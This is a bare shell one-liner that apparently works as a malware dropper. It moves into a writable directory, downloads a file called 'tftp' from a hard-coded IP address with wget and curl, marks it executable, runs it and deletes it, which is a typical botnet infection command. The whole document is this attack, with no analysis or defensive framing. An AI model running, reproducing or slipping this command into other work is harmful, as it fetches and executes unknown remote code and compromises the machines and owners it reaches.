cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.180.133.151/tftp; curl -O http://199.180.133.151/tftp; chmod +x tftp; ./tftp; rm -rf tftp
